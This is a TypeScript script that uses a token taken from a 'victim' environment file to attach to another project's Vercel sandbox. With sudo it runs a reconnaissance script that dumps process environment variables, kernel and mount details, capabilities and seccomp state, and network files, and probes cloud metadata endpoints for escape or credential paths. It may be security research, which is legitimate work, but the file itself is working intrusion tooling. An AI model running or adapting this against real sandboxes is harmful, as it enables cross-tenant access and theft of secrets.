import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== 1. /proc/cmdline (readable by any user code?) ==="
cat /proc/cmdline 2>&1 | head -c 2000; echo ""
echo "=== 2. hostname / /etc/hostname ==="
hostname; cat /etc/hostname 2>/dev/null
echo "=== 3. /proc/1/environ ==="
tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | head -40
echo "=== 4. env ==="
env | sort | head -40
echo "=== 5. /proc/self/mountinfo (visible mounts) ==="
grep -E "vda|overlay|/dev/" /proc/self/mountinfo | head -20
echo "=== 6. /proc/self/cgroup ==="
cat /proc/self/cgroup 2>&1 | head -5
echo "=== 7. /proc/self/status caps ==="
grep -E "Cap|Seccomp|NoNewPrivs" /proc/self/status
echo "=== 8. kernel version / uname ==="
uname -a
echo "=== 9. /etc/hosts ==="
cat /etc/hosts 2>/dev/null
echo "=== 10. resolv.conf ==="
cat /etc/resolv.conf 2>/dev/null
echo "=== 11. /proc/net/route ==="
cat /proc/net/route 2>/dev/null
echo "=== 12. /sys/class/dmi/id/product_uuid etc ==="
cat /sys/class/dmi/id/product_uuid 2>/dev/null; cat /sys/class/dmi/id/bios_vendor 2>/dev/null
echo "=== 13. AWS metadata attempts ==="
timeout 2 curl -s --max-time 1.5 http://169.254.169.254/latest/meta-data/ 2>&1 | head -3
timeout 2 curl -s --max-time 1.5 http://100.100.100.200/latest/meta-data/ 2>&1 | head -3
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore36.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore36.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
